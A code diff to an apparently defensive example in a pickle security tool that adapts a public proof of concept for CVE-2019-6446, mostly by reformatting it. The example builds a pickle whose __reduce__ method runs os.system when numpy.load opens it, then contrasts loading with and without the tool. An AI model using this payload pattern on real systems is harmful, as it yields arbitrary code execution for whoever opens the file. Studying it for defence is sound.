@@ -1,4 +1,4 @@
-# PoC from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)
+# This PoC has been adapted from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)
 
 import numpy
 import os
@@ -11,23 +11,23 @@ class Test(object):
         self.a = 1
 
     def __reduce__(self):
-        return (os.system,('python pytorch_poc.py',))
+        # Runs the other PoC found in /examples
+        return (os.system, ("python pytorch_poc.py",))
 
 
 payload = Test()
 
 
-print("\n\nRUN THIS CLASS WITHOUT FICKLING\n\n")
+print("\n\nWithout fickling\n\n")
 
-with open("a-file.pickle",'wb') as f:
-    pickle.dump(payload , f)
+with open("a-file.pickle", "wb") as f:
+    pickle.dump(payload, f)
 
-# The original PoC used an earlier version where allow_pickle was True by default 
-numpy.load('a-file.pickle', allow_pickle=True)
+# The original PoC used an earlier version where allow_pickle was True by default
+numpy.load("a-file.pickle", allow_pickle=True)
 
 
-print("\n\nRUN THIS CLASS WITH FICKLING\n\n")
-
+print("\n\nWith fickling\n\n")
 
 fickled_payload = Pickled.load(pickle.dumps(payload))
 
